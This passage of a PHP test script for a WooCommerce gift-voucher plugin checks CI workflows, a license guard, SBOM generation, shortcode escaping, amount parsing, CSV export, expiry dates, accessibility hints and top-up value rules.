check( 'R15: the ecosystem gate installs pinned plugin versions (every matrix entry has one, the install uses it)', isset( $r15[1] ) && substr_count( $r15[1], '- key:' ) >= 5 && substr_count( $r15[1], '- key:' ) === preg_match_all( "/\n\s+version: '\d+(\.\d+)+'/", $r15[1] ) && str_contains( $r15[1], 'plugin install ${{ matrix.slug }} --version=${{ matrix.version }}' ) );
$smoke_release = (string) file_get_contents( "$root/.github/workflows/release-smoke.yml" );
check( 'the release smoke is manual and installs the draft ZIP over the previous release', str_contains( $smoke_release, "on:\n  workflow_dispatch:" ) && ! preg_match( '/^\s+(push|pull_request|schedule):/m', $smoke_release ) && str_contains( $smoke_release, 'tests/release-smoke.php' ) && ! preg_match( '/secrets\.|licen[cs]e server/i', $smoke_release ) && is_file( "$root/tests/release-smoke.php" ) );
check( 'CI runs the license guard in the smoke job', str_contains( $smoke_yml, 'php tests/license-guard.php' ) && is_file( "$root/tests/license-guard.php" ) );
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( "$root/tests/license-guard.php" ) . ' 2>&1', $guard_log, $guard_status );
check( 'free core: no licensing or update code in the shipped files (tests/license-guard.php)', 0 === $guard_status, implode( ' ', $guard_log ) );
// R16-09: the guard also knows the patterns of Affiliate Captain's guard (wplc_ prefix, entitlement wording, license
// key) and accepts nothing but the clean-up list of earlier builds in src/Install.php.
$guard_tmp = sys_get_temp_dir() . '/vcap-guard-' . bin2hex( random_bytes( 4 ) );
mkdir( "$guard_tmp/src", 0700, true );
$guard_run = static function () use ( $root, $guard_tmp ): array {
	$log = array();
	exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( "$root/tests/license-guard.php" ) . ' ' . escapeshellarg( $guard_tmp ) . ' 2>&1', $log, $status );
	return array( $status, implode( ' ', $log ) );
};
file_put_contents( "$guard_tmp/voucher-captain.php", "<?php\n/**\n * Plugin Name: X\n */\n" );
file_put_contents( "$guard_tmp/src/Install.php", "<?php\n/**\n * Options of the license client of earlier builds and the stored entitlement snapshot.\n */\n\$legacy = array(\n\t'vcap_wplc_credentials',\n\t'vcap_wplc_credentials_entitlements_cache',\n);\n" );
list( $guard_clean_status, $guard_clean_log ) = $guard_run();
$guard_samples = array(
	'entitlement wording' => "if ( ! vcap_has_entitlement( 'voucher.reports' ) ) { return; }",
	'license key'         => "update_option( 'vcap_license_key', \$key );",
	'wplc option'         => "get_option( 'wplc_credentials' );",
	'legacy name in code' => "get_option( 'vcap_wplc_credentials' );",
);
$guard_missed = array();
foreach ( $guard_samples as $guard_label => $guard_sample ) {
	file_put_contents( "$guard_tmp/src/Sample.php", "<?php\n$guard_sample\n" );
	list( $guard_sample_status, $guard_sample_log ) = $guard_run();
	if ( 1 !== $guard_sample_status || ! str_contains( $guard_sample_log, 'src/Sample.php:2' ) ) {
		$guard_missed[] = $guard_label;
	}
}
array_map( 'unlink', array_filter( array( "$guard_tmp/src/Sample.php", "$guard_tmp/src/Install.php", "$guard_tmp/voucher-captain.php" ), 'is_file' ) );
rmdir( "$guard_tmp/src" );
rmdir( $guard_tmp );
check( 'R16-09: the license guard accepts the clean-up list of earlier builds and fails on entitlement wording, license keys and wplc_ names', 0 === $guard_clean_status && array() === $guard_missed, $guard_clean_log . ' missed: ' . implode( ', ', $guard_missed ) );
$plugin_src = (string) file_get_contents( "$root/src/Plugin.php" );
check( 'free core: top-up, referrals, ticket vouchers and the shared scanner are registered unconditionally', ! is_dir( "$root/src/Licensing" ) && ! is_file( "$root/config/premium-features.php" ) && ! str_contains( $plugin_src, 'Licensing' ) && str_contains( $plugin_src, '( new TopUp( $this->vouchers, $this->coupons ) )->register();' ) && str_contains( $plugin_src, '$referrals->register();' ) && str_contains( $plugin_src, '$this->passcaptain_tickets->register();' ) && str_contains( $plugin_src, '( new Compat\PassCaptainScanner() )->register();' ) );
check( 'free core: license data of earlier builds is removed on upgrade and uninstall', in_array( 'vcap_wplc_credentials', VCAP\Install::LEGACY_LICENSE_OPTIONS, true ) && 'vcap_license_refresh' === VCAP\Install::LEGACY_LICENSE_HOOK && str_contains( (string) file_get_contents( "$root/uninstall.php" ), 'vcap_uninstall_license_data();' ) );
$bundled = json_decode( (string) file_get_contents( "$root/bin/bundled-assets.json" ), true );
$jsqr    = is_array( $bundled ) ? current( array_filter( $bundled, static fn( $a ) => 'jsqr' === $a['name'] ) ) : null;
check( 'bin/bundled-assets.json records the shipped jsQR file (SHA-256) – a replaced file needs a new version entry', $jsqr && hash_file( 'sha256', "$root/{$jsqr['path']}" ) === $jsqr['sha256'] );
check( 'the scanner enqueues jsQR with the version recorded for the SBOM and the vulnerability check', $jsqr && str_contains( (string) file_get_contents( "$root/src/Admin/Scanner.php" ), "'assets/vendor/jsqr/jsQR.js', array(), '{$jsqr['version']}'" ) );
$sbom_file = $out . '/sbom.cdx.json';
@unlink( $sbom_file );
shell_exec( 'SOURCE_DATE_EPOCH=1700000000 ' . escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( "$root/bin/sbom.php" ) . ' ' . escapeshellarg( $root ) . ' ' . escapeshellarg( $sbom_file ) . ' 2>&1' );
$sbom  = is_file( $sbom_file ) ? json_decode( (string) file_get_contents( $sbom_file ), true ) : null;
$purls = is_array( $sbom ) ? array_column( $sbom['components'], 'purl' ) : array();
check( 'SBOM: CycloneDX 1.5 with the plugin, its Composer packages and jsQR (npm purl with SHA-256)', is_array( $sbom ) && 'CycloneDX' === $sbom['bomFormat'] && '1.5' === $sbom['specVersion'] && ( preg_match( '/^ \* Version:\s*(\S+)/m', (string) file_get_contents( "$root/voucher-captain.php" ), $vm ) ? $vm[1] : '?' ) === $sbom['metadata']['component']['version'] && in_array( 'pkg:npm/jsqr@1.4.0', $purls, true ) && (bool) preg_grep( '#^pkg:composer/dompdf/dompdf@#', $purls ) && ! preg_grep( '#phpstan|php-stubs#', $purls ), json_encode( $purls ) );
$sbom_again = (string) shell_exec( 'SOURCE_DATE_EPOCH=1700000000 ' . escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( "$root/bin/sbom.php" ) . ' ' . escapeshellarg( $root ) . ' 2>&1' );
check( 'SBOM is reproducible (same sources and SOURCE_DATE_EPOCH, same file and serial number)', is_file( $sbom_file ) && file_get_contents( $sbom_file ) === $sbom_again );
echo "Storefront output (shortcodes, blocks, forms)\n";
if ( ! function_exists( 'has_shortcode' ) ) {
	function has_shortcode( $content, $tag ) { return str_contains( (string) $content, '[' . $tag ); }
}
if ( ! function_exists( 'get_post_field' ) ) {
	function get_post_field( $field, $id ) { return $GLOBALS['vcap_test_posts'][ (int) $id ][ $field ] ?? ''; }
}
if ( ! function_exists( 'get_post_type' ) ) {
	function get_post_type( $id = null ) { return $GLOBALS['vcap_test_posts'][ (int) $id ]['post_type'] ?? false; }
}
if ( ! function_exists( 'parse_blocks' ) ) {
	// Only what the test content uses: synced pattern references at the top level and inside a group.
	function parse_blocks( $content ) {
		$blocks = array();
		preg_match_all( '/<!-- wp:block \{"ref":(\d+)\} \/-->/', (string) $content, $m );
		foreach ( $m[1] as $ref ) {
			$blocks[] = array( 'blockName' => 'core/group', 'attrs' => array(), 'innerBlocks' => array( array( 'blockName' => 'core/block', 'attrs' => array( 'ref' => (int) $ref ), 'innerBlocks' => array() ) ) );
		}
		return $blocks;
	}
}
$escaped = VCAP\Shortcodes::escape_shortcodes( '<input value="[vcap_referral]" /><script>var a = [1, 2];</script><p>[x]</p>' );
check( 'block output: brackets become entities, so do_shortcode() runs no shortcode from visitor text', '<input value="&#91;vcap_referral&#93;" /><script>var a = [1, 2];</script><p>&#91;x&#93;</p>' === $escaped, $escaped );
check( 'visitor text in attributes and text has its brackets escaped', '&#91;vcap_referral&#93; &quot;x&quot;' === VCAP\Shortcodes::esc_attr_text( '[vcap_referral] "x"' ) && '&lt;b&gt;&#91;a&#93;' === VCAP\Shortcodes::esc_html_text( '<b>[a]' ) );
check( 'a code from a redeem link keeps only code characters', 'vcap_referral' === VCAP\Shortcodes::clean_code( '[vcap_referral]' ) && 'GIFT-ABC 12' === VCAP\Shortcodes::clean_code( " GIFT-ABC 12\"'<>`\\ " ) && 100 === strlen( VCAP\Shortcodes::clean_code( str_repeat( 'A', 150 ) ) ) );
$first  = VCAP\Shortcodes::unique_id( 'vcap-test-field' );
$second = VCAP\Shortcodes::unique_id( 'vcap-test-field' );
check( 'ids are unique on the page and the first form keeps its id', 'vcap-test-field' === $first && 'vcap-test-field-2' === $second && 'vcap-test-field-3' === VCAP\Shortcodes::unique_id( 'vcap-test-field' ) );
$suffix = VCAP\Shortcodes::voucher_suffix( 'GIFT-[1]' );
check( 'buttons of a voucher list name the voucher in hidden text, not in aria-label (label in name)', '<span class="screen-reader-text"> – voucher GIFT-&#91;1&#93;</span>' === $suffix, $suffix );
check( 'shortcode output is wrapped in div.woocommerce (WooCommerce styles on any page)', '<div class="woocommerce" id="vcap-redeem"><form></form></div>' === VCAP\Shortcodes::wrap( '<form></form>', 'vcap-redeem' ) && 'button' === VCAP\Shortcodes::button_class() );

$GLOBALS['vcap_test_posts'] = array(
	501 => array( 'post_type' => 'wp_block', 'post_content' => '<!-- wp:vcap/redeem /-->' ),
	502 => array( 'post_type' => 'wp_block', 'post_content' => '<!-- wp:block {"ref":501} /-->' ),
	503 => array( 'post_type' => 'page', 'post_content' => '<!-- wp:block {"ref":502} /-->' ),
	504 => array( 'post_type' => 'page', 'post_content' => '<!-- wp:paragraph --><p>Hi</p><!-- /wp:paragraph -->' ),
	505 => array( 'post_type' => 'page', 'post_content' => '' ),
	506 => array( 'post_type' => 'post', 'post_content' => '<!-- wp:vcap/redeem /-->' ),
	507 => array( 'post_type' => 'page', 'post_content' => '<!-- wp:block {"ref":506} /-->' ),
);
$GLOBALS['vcap_test_meta'][505]['_elementor_data'] = '[{"widgetType":"shortcode","settings":{"shortcode":"[vcap_redeem]"}}]';
check( 'the redeem form is found in synced patterns, also nested ones', VCAP\Shortcodes::page_has_redeem_form( 503 ) && ! VCAP\Shortcodes::page_has_redeem_form( 504 ) );
check( 'only synced patterns are followed, not other posts', ! VCAP\Shortcodes::page_has_redeem_form( 507 ) );
check( 'the redeem form is found in Elementor data', VCAP\Shortcodes::page_has_redeem_form( 505 ) );
unset( $GLOBALS['vcap_test_posts'], $GLOBALS['vcap_test_meta'][505] );

$amount_config = array( 'custom_presets' => '25, 50;100' ) + ProductConfig::DEFAULTS;
check( 'suggested amount chosen without JavaScript (radio button) is the amount', '50' === VCAP\CustomAmount::posted_amount( $amount_config, array( 'vcap_amount_preset' => '50', 'vcap_amount' => '' ) ) );
check( 'a typed amount wins over the chosen suggestion', '37' === VCAP\CustomAmount::posted_amount( $amount_config, array( 'vcap_amount_preset' => '50', 'vcap_amount' => '37' ) ) );
check( 'only configured suggestions count', '' === VCAP\CustomAmount::posted_amount( $amount_config, array( 'vcap_amount_preset' => '5000' ) ) && '' === VCAP\CustomAmount::posted_amount( $amount_config, array( 'vcap_amount_preset' => array( '50' ) ) ) );

echo "Strict amounts (Q7, H12, H13)\n";
$amt = static fn( $raw, array $o = array() ) => VCAP\Amount::parse( $raw, $o + array( 'decimals' => 2, 'decimal_sep' => '.', 'strip' => array( 'EUR', '€' ) ) );
check( 'Q7: "2,50" in a shop with a decimal point is 2.50, never 250', 250 === $amt( '2,50' )['minor'] && 2.5 === $amt( '2,50' )['value'] );
check( 'Q7: "12,50 €", "€ 1.234,50" and "1 234,50" are read like the scanner', 1250 === $amt( '12,50 €' )['minor'] && 123450 === $amt( '€ 1.234,50' )['minor'] && 123450 === $amt( '1 234,50' )['minor'] && 123450 === $amt( "1'234.50" )['minor'] );
check( 'Q7: a Unicode minus or dash is "negative", not +5', 'negative' === $amt( '−5' )['error'] && 'negative' === $amt( '–5' )['error'] && 'negative' === $amt( '-5' )['error'] );
check( 'Q7: with a sign allowed, "−5" is -5 and "+10" is 10', -5.0 === $amt( '−5', array( 'allow_negative' => true ) )['value'] && 10.0 === $amt( '+10', array( 'allow_negative' => true ) )['value'] && 'invalid' === $amt( '+10' )['error'] );
check( 'Q7: "1e3", "12,50; 25", "1..5" and "abc" are invalid instead of 13 / 12 / guesses', 'invalid' === $amt( '1e3' )['error'] && 'invalid' === $amt( '12,50; 25' )['error'] && 'invalid' === $amt( '1..5' )['error'] && 'invalid' === $amt( 'abc' )['error'] && 'invalid' === $amt( array( '5' ) )['error'] );
check( 'Q7: "1.500" is ambiguous with two decimals, 1.5 with three decimals and a decimal point', 'ambiguous' === $amt( '1.500' )['error'] && 1500 === $amt( '1.500', array( 'decimals' => 3 ) )['minor'] && 'ambiguous' === $amt( '1,500', array( 'decimals' => 3 ) )['error'] );
check( 'Q7: too many decimals, zero and empty are refused with their reason', 'decimals' === $amt( '0,999' )['error'] && 'zero' === $amt( '0' )['error'] && 'empty' === $amt( ' € ' )['error'] && $amt( '0', array( 'allow_zero' => true ) )['ok'] );
check( 'Q7: the reason is explained (e.g. ambiguous with an example)', false !== strpos( VCAP\Amount::message( 'ambiguous', 2 ), 'ambiguous' ) && false !== strpos( VCAP\Amount::message( 'decimals', 0 ), 'no decimal' ) );
check( 'H13: suggested amounts are separated by semicolons, "12,50" stays one amount', array( 12.5, 25.0 ) === VCAP\Amount::parse_list( '12,50; 25' )['values'] && array( 12.5, 25.0, 50.0 ) === VCAP\Amount::parse_list( "12,50\n25\n50" )['values'] );
check( 'H13: legacy comma lists still work ("10, 25, 50", "10,25,50")', array( 10.0, 25.0, 50.0 ) === VCAP\Amount::parse_list( '10, 25, 50' )['values'] && array( 10.0, 25.0, 50.0 ) === VCAP\Amount::parse_list( '10,25,50' )['values'] );
$preset_config = array( 'amount_source' => 'custom', 'custom_presets' => '12,50; 25; zehn', 'custom_min' => '', 'custom_max' => '', 'custom_step' => '0.5' ) + ProductConfig::DEFAULTS;
check( 'H13: presets become plain numbers; an unreadable entry is reported on the product screen', array( '12.5', '25' ) === VCAP\CustomAmount::presets( $preset_config ) && (bool) array_filter( VCAP\CustomAmount::config_errors( $preset_config ), static fn( $e ) => false !== strpos( $e, '"zehn"' ) && false !== strpos( $e, 'semicolon' ) ), json_encode( VCAP\CustomAmount::config_errors( $preset_config ) ) );
check( 'Q7: a typed "12,50" is the amount 12.50; "1e3" is handed on and refused', '12.5' === VCAP\CustomAmount::posted_amount( $preset_config, array( 'vcap_amount' => '12,50' ) ) && null !== VCAP\CustomAmount::error_for( $preset_config, VCAP\CustomAmount::posted_amount( $preset_config, array( 'vcap_amount' => '1e3' ) ) ) );
$range_config = array( 'amount_source' => 'custom', 'custom_presets' => '', 'custom_min' => '10', 'custom_max' => '200', 'custom_step' => '5' ) + ProductConfig::DEFAULTS;
$range_error  = (string) VCAP\CustomAmount::error_for( $range_config, '250' );
check( 'H12: the range error names both limits', false !== strpos( $range_error, '10,00' ) && false !== strpos( $range_error, '200,00' ), $range_error );
check( 'H12: a minimum or maximum alone is named as well', false !== strpos( (string) VCAP\CustomAmount::error_for( array( 'custom_max' => '' ) + $range_config, '5' ), 'at least 10,00' ) && false !== strpos( (string) VCAP\CustomAmount::error_for( array( 'custom_min' => '' ) + $range_config, '250' ), 'more than 200,00' ) );
$step_error = (string) VCAP\CustomAmount::error_for( $range_config, '12' );
check( 'H12: the step error names the step and the nearest allowed amounts', false !== strpos( $step_error, 'steps of 5,00' ) && false !== strpos( $step_error, '10,00' ) && false !== strpos( $step_error, '15,00' ), $step_error );
check( 'Q7/H12: an ambiguous amount says why instead of "outside the range"', false !== strpos( (string) VCAP\CustomAmount::error_for( $range_config, '1.500' ), 'ambiguous' ) );
check( 'Q7: number fields are read strictly ("2,50" = 2.5, "1e3" refused)', '2.5' === VCAP\Fields::parse_number( '2,50' ) && null === VCAP\Fields::parse_number( '1e3' ) && '-3' === VCAP\Fields::parse_number( '−3' ) );

echo "CSV export format (A15)\n";
$w15_readme = (string) file_get_contents( dirname( __DIR__ ) . '/readme.txt' );
$w15_main   = (string) file_get_contents( dirname( __DIR__ ) . '/voucher-captain.php' );
preg_match( "/define\\( 'VCAP_DB_VERSION', '([0-9.]+)' \\)/", $w15_main, $w15_db );
preg_match( '/== Upgrade Notice ==\s*= [0-9.]+ =\s*(.+)/', $w15_readme, $w15_notice );
check( 'AP-W1-5: readme names the filter vcap_pdf_remote_hosts instead of "PDFs never load remote images"', str_contains( $w15_readme, '`vcap_pdf_remote_hosts`' ) && ! str_contains( $w15_readme, 'never load remote images' ) );
check( 'AP-W1-5: the upgrade notice names the current database version', isset( $w15_db[1], $w15_notice[1] ) && str_contains( $w15_notice[1], 'database is updated to version ' . $w15_db[1] ), $w15_notice[1] ?? '' );
check( 'AP-W1-6: the new product editor is declared incompatible', str_contains( $w15_main, "declare_compatibility( 'product_block_editor', __FILE__, false )" ) );
check( 'AP-W1-4: CSV downloads are sent with "X-Content-Type-Options: nosniff" (attachment, text/csv)', in_array( 'X-Content-Type-Options: nosniff', VCAP\Csv::headers( 'vouchers.csv' ), true ) && in_array( 'Content-Disposition: attachment; filename="vouchers.csv"', VCAP\Csv::headers( 'vouchers.csv' ), true ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Csv.php' ), 'foreach ( self::headers( $filename ) as $line )' ) );
check( 'A15: decimal comma for fr/it/es/nl/pl/de, point for de_CH(_informal) and en', ',' === VCAP\Csv::locale_decimal( 'fr_FR' ) && ',' === VCAP\Csv::locale_decimal( 'it_IT' ) && ',' === VCAP\Csv::locale_decimal( 'es_ES' ) && ',' === VCAP\Csv::locale_decimal( 'nl_NL' ) && ',' === VCAP\Csv::locale_decimal( 'pl_PL' ) && ',' === VCAP\Csv::locale_decimal( 'de_DE_formal' ) && '.' === VCAP\Csv::locale_decimal( 'de_CH_informal' ) && '.' === VCAP\Csv::locale_decimal( 'de_CH' ) && '.' === VCAP\Csv::locale_decimal( 'en_US' ) && '.' === VCAP\Csv::locale_decimal( 'es_MX' ) );
$GLOBALS['wp_locale'] = (object) array( 'number_format' => array( 'decimal_point' => ',', 'thousands_sep' => ' ' ) );
check( 'A15: an unknown language follows WordPress\' number format of the current locale', ',' === VCAP\Csv::locale_decimal( 'xx_XX' ) );
unset( $GLOBALS['wp_locale'] );
VCAP\Csv::reset();
check( 'A15: a decimal comma comes with ";" as the field separator', array( 'separator' => ';', 'decimal' => ',' ) === VCAP\Csv::format() );
$report_csv = VCAP\Reports::csv_rows( array( array( 'type' => 'coupon', 'name' => 'X (JPY)', 'issued' => null, 'uses' => 1, 'orders' => 1, 'discount' => 500.0, 'revenue' => 4500.0, 'currency' => 'JPY' ), array( 'type' => 'coupon', 'name' => 'Y', 'issued' => null, 'uses' => 1, 'orders' => 1, 'discount' => 5.0, 'revenue' => 45.0 ) ) );
check( 'A15: the report CSV names each row\'s own currency (with its decimals)', 'JPY' === $report_csv[1][7] && '500' === $report_csv[1][5] && 'EUR' === $report_csv[2][7] && '5,00' === $report_csv[2][5], json_encode( $report_csv ) );
VCAP\Csv::reset();

echo "Expiry date on the edit form (Q13)\n";
$pe   = array( VCAP\Admin\VoucherAdmin::class, 'parse_expiry' );
$next = ( (int) wp_date( 'Y' ) + 1 ) . '-06-30';
check( 'Q13: a plausible date is taken', array( 'ok' => true, 'date' => $next, 'error' => '' ) === $pe( $next, false, '2030-01-01' ) );
check( 'Q13: "0026-12-31" (year typed as "26") and a date 60 years ahead are refused', ! $pe( '0026-12-31', false, '' )['ok'] && ! $pe( ( (int) wp_date( 'Y' ) + 60 ) . '-01-01', false, '' )['ok'] && ! $pe( '2027-02-30', false, '' )['ok'] );
check( 'Q13: an emptied field is not "never expires" – only the checkbox is', ! $pe( '', false, '2030-01-01' )['ok'] && array( 'ok' => true, 'date' => null, 'error' => '' ) === $pe( '', true, '2030-01-01' ) && $pe( '', false, '' )['ok'] );
check( 'Q13: an unchanged old date of an expired voucher can still be saved', array( 'ok' => true, 'date' => '2019-12-31', 'error' => '' ) === $pe( '2019-12-31', false, '2019-12-31' ) );

echo "Required field hints (H14)\n";
$req_defs = VCAP\Fields::builtin_definitions( array_merge( ProductConfig::DEFAULTS, array( 'builtin_fields' => array( 'recipient_email', 'recipient_email_required', 'delivery_date', 'delivery_date_required' ) ) ) );
check( 'H14: required recipient email and delivery date do not say "leave empty"', true === $req_defs['recipient_email']['required'] && false === stripos( $req_defs['recipient_email']['tooltip'], 'leave empty' ) && false === stripos( $req_defs['delivery_date']['tooltip'], 'leave empty' ) && '' !== $req_defs['delivery_date']['tooltip'], json_encode( array( $req_defs['recipient_email']['tooltip'], $req_defs['delivery_date']['tooltip'] ) ) );
$opt_defs = VCAP\Fields::builtin_definitions( array_merge( ProductConfig::DEFAULTS, array( 'builtin_fields' => array( 'recipient_email', 'delivery_date' ) ) ) );
check( 'H14: optional fields keep the "leave empty" hint', false !== stripos( $opt_defs['recipient_email']['tooltip'], 'leave empty' ) && false !== stripos( $opt_defs['delivery_date']['tooltip'], 'leave empty' ) );
$req_buyer = VCAP\Fields::builtin_definitions( array_merge( ProductConfig::DEFAULTS, array( 'send_to' => 'buyer', 'email_restrict' => 'recipient', 'builtin_fields' => array( 'recipient_email', 'recipient_email_required' ) ) ) );
check( 'H14: "buyer only" with a required address drops "(yours, if you leave it empty)"', false === stripos( $req_buyer['recipient_email']['tooltip'], 'leave it empty' ) && false !== strpos( $req_buyer['recipient_email']['tooltip'], 'Only this address' ) );

$GLOBALS['vcap_test_options']['vcap_terms_by_country'] = "AT: Austria terms\nDE: Germany terms";
$GLOBALS['vcap_test_options']['vcap_default_terms']    = 'General terms';
check( 'product pages list every country variant of the conditions (same HTML for every visitor, cacheable)', array( 'AT' => 'Austria terms', 'DE' => 'Germany terms', '' => 'General terms' ) === ProductConfig::terms_variants( ProductConfig::DEFAULTS ) );
check( 'the product\'s own conditions are the only variant', array( '' => 'Own' ) === ProductConfig::terms_variants( array( 'redemption_terms' => 'Own' ) + ProductConfig::DEFAULTS ) );
unset( $GLOBALS['vcap_test_options']['vcap_terms_by_country'], $GLOBALS['vcap_test_options']['vcap_default_terms'] );

if ( ! class_exists( 'WP_REST_Request' ) ) {
	class WP_REST_Request {
		public function __construct( private string $method = 'GET', private string $route = '', private array $params = array() ) {}
		public function get_route() { return $this->route; }
		public function get_param( $key ) { return $this->params[ $key ] ?? null; }
	}
}
$promotions = new VCAP\Discounts\Repository();
( new ReflectionProperty( $promotions, 'cache' ) )->setValue( $promotions, array( 12 => array( 'id' => 12, 'title' => 'Summer sale', 'priority' => 0, 'rules' => array() ) ) );
$promotion_cart = new VCAP\Discounts\CartIntegration( new VCAP\Settings(), $promotions );
$refused        = $promotion_cart->refuse_removal( null, null, new WP_REST_Request( 'POST', '/wc/store/v1/cart/remove-coupon', array( 'code' => 'vcap-campaign-12' ) ) );
check( 'cart block: removing an automatic promotion is refused with a message', $refused instanceof WP_Error && 'vcap_promotion_not_removable' === $refused->get_error_code() && 400 === $refused->get_error_data()['status'] );
check( 'cart block: other coupons and routes are not affected', null === $promotion_cart->refuse_removal( null, null, new WP_REST_Request( 'POST', '/wc/store/v1/cart/remove-coupon', array( 'code' => 'summer10' ) ) ) && null === $promotion_cart->refuse_removal( null, null, new WP_REST_Request( 'POST', '/wc/store/v1/cart/apply-coupon', array( 'code' => 'vcap-campaign-12' ) ) ) );

// F7 (frontend.js, no JS runtime here): the counter is the field's description, not a live region; a separate
// live region speaks the characters left only near the limit and only after typing paused.
$front_js = (string) file_get_contents( dirname( __DIR__ ) . '/assets/js/frontend.js' );
check( 'F7: the character counter gets an id and is linked to its field by aria-describedby', str_contains( $front_js, "\$counter = \$( '<span class=\"vcap-counter\"></span>' ).attr( 'id', id );" ) && str_contains( $front_js, "\$input.attr( 'aria-describedby', described );" ) && ! preg_match( '/class="vcap-counter"[^>]*aria-live/', $front_js ) );
check( 'F7: a separate live region announces only at or below 20 characters left, debounced', str_contains( $front_js, 'var ANNOUNCE_BELOW = 20;' ) && str_contains( $front_js, 'class="vcap-counter-live screen-reader-text" aria-live="polite"' ) && str_contains( $front_js, "clearTimeout( \$input.data( 'vcapAnnounce' ) );" ) && str_contains( $front_js, "\$region.text( left <= ANNOUNCE_BELOW ? text : '' );" ) && (bool) preg_match( '/var ANNOUNCE_DELAY = [5-9]\d\d;/', $front_js ) );
check( 'F7: an unchanged counter text is not written again (no repeated announcement on focus)', str_contains( $front_js, 'if ( $counter.text() === text ) {' ) );
// G5 (blocks.js): the server-side preview is wrapped in wp.components.Disabled (no POSTs, no downloads from the editor).
$blocks_js = (string) file_get_contents( dirname( __DIR__ ) . '/assets/js/blocks.js' );
check( 'G5: the block preview (ServerSideRender) is wrapped in wp.components.Disabled', str_contains( $blocks_js, 'var components = wp.components || {};' ) && str_contains( $blocks_js, 'preview = el( components.Disabled, null, preview );' ) && str_contains( $blocks_js, 'var preview = ServerSideRender ? el( ServerSideRender, {' ) );

echo "Refunds, returns and top-ups (wave I)\n";
// T11: a top-up adds its face value like a new gift card – never what was paid after coupons.
$topup_cfg = ProductConfig::DEFAULTS;
check( 'top-up value: line price before discounts, gross where prices include tax', array( 119.0, false ) === VCAP\TopUp::line_value( $topup_cfg, 1, 100.0, 19.0, true ) );
check( 'top-up value in a net-price shop: the net price (like a new gift card), not net + VAT', array( 50.0, false ) === VCAP\TopUp::line_value( $topup_cfg, 1, 50.0, 9.5, false ) );
check( 'top-up value: a fixed amount per unit, already in the base currency', array( 50.0, true ) === VCAP\TopUp::line_value( array( 'amount_source' => 'fixed', 'amount' => '25' ) + $topup_cfg, 2, 0.0, 0.0, true ) );
check( 'top-up value: the amount the customer entered, per unit', array( 80.0, false ) === VCAP\TopUp::line_value( array( 'amount_source' => 'custom' ) + $topup_cfg, 2, 67.23, 12.77, true, '40' ) );
check( 'S4: a top-up adds no more than was paid, and an amount entered in another currency counts as the amount paid', array( 70.0, false ) === VCAP\TopUp::line_value( array( 'amount_source' => 'custom' ) + $topup_cfg, 2, 70.0, 0.0, true, '40' ) && array( 60.0, false ) === VCAP\TopUp::line_value( array( 'amount_source' => 'custom' ) + $topup_cfg, 2, 60.0, 0.0, true, '40', 'payment', 'EUR', 'USD' ) );
check( 'S4: a chosen amount is the face value only up to the amount paid per voucher and in the currency it was entered in', array( 50.0, false ) === VCAP\Issuer::custom_face_value( '50', 'EUR', 'EUR', 50.004, 2 ) && array( 42.5, true ) === VCAP\Issuer::custom_face_value( '50', 'EUR', 'EUR', 42.5, 2 ) && array( 45.0, true ) === VCAP\Issuer::custom_face_value( '50', 'USD', 'EUR', 45.0, 2 ) && array( 30.0, false ) === VCAP\Issuer::custom_face_value( '', '', 'EUR', 30.0, 2 ) && array( 20.0, false ) === VCAP\Issuer::custom_face_value( '20', '', 'EUR', 50.0, 2 ) && array( 0.0, true ) === VCAP\Issuer::custom_face_value( '50', 'EUR', 'EUR', 0.0, 2 ) );
check( 'S4: the currency is fixed with the amount when it is added to the cart and stored on the order line', str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/CustomAmount.php' ), "\$data['vcap_currency'] = (string) get_woocommerce_currency();" ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/CustomAmount.php' ), 'self::CURRENCY_META' ) );
check( 'top-up paid completely with another gift card still adds its value (subtotal, not total)', VCAP\TopUp::line_value( $topup_cfg, 1, 100.0, 0.0, true )[0] > 0 );
// M12-12: the T7 gross rule is shared by new gift cards (Issuer::voucher_amount()) and top-ups.
check( 'M12-12: net-price shop, single-purpose top-up sold with VAT: the gross amount paid (50 + 19 % = 59.50)', array( 59.5, false ) === VCAP\TopUp::line_value( $topup_cfg, 1, 50.0, 9.5, false, '', 'single' ) );
check( 'M12-12: a multi-purpose top-up keeps the net value; an entered amount follows the same rule', array( 50.0, false ) === VCAP\TopUp::line_value( $topup_cfg, 1, 50.0, 9.5, false, '', 'payment' ) && array( 59.5, false ) === VCAP\TopUp::line_value( array( 'amount_source' => 'custom' ) + $topup_cfg, 1, 50.0, 9.5, false, '50', 'single' ) );
check( 'M12-12: Issuer::sold_with_vat_value(): unchanged for fixed amounts, single use, untaxed sales and tax-inclusive shops', 50.0 === VCAP\Issuer::sold_with_vat_value( 50.0, array( 'amount_source' => 'fixed', 'usage' => 'balance' ), 50.0, 9.5, 'single', false ) && 50.0 === VCAP\Issuer::sold_with_vat_value( 50.0, array( 'usage' => 'single' ), 50.0, 9.5, 'single', false ) && 50.0 === VCAP\Issuer::sold_with_vat_value( 50.0, array( 'usage' => 'balance' ), 50.0, 0.0, 'single', false ) && 50.0 === VCAP\Issuer::sold_with_vat_value( 50.0, array( 'usage' => 'balance' ), 50.0, 9.5, 'single', true ) );
check( 'M12-69: DATEV financial year start follows the setting (MMDD)', '20260101' === VCAP\DatevExport::financial_year_start( '2026-11-15', '0101' ) && '20250701' === VCAP\DatevExport::financial_year_start( '2026-03-01', '0701' ) && '20260701' === VCAP\DatevExport::financial_year_start( '2026-07-01', '0701' ) );
// E4: no top-up onto a card that expires soon.
$soon             = new Voucher();
$soon->code       = 'GIFT-SOON';
$soon->expires_at = gmdate( 'Y-m-d H:i:s', time() + 5 * DAY_IN_SECONDS );
$later            = clone $soon;
$later->expires_at = gmdate( 'Y-m-d H:i:s', time() + 60 * DAY_IN_SECONDS );
$never            = clone $soon;
$never->expires_at = null;
check( 'top-up refused for a card valid less than 30 days, with its expiry date', '' !== VCAP\TopUp::remaining_validity_error( $soon ) && str_contains( VCAP\TopUp::remaining_validity_error( $soon ), wp_date( (string) get_option( 'date_format', 'Y-m-d' ), strtotime( $soon->expires_at . ' UTC' ) ) ) );
check( 'top-up allowed for a card valid long enough or without expiry', '' === VCAP\TopUp::remaining_validity_error( $later ) && '' === VCAP\TopUp::remaining_validity_error( $never ) );
add_filter( 'vcap_topup_min_remaining_days', static fn() => 0 );
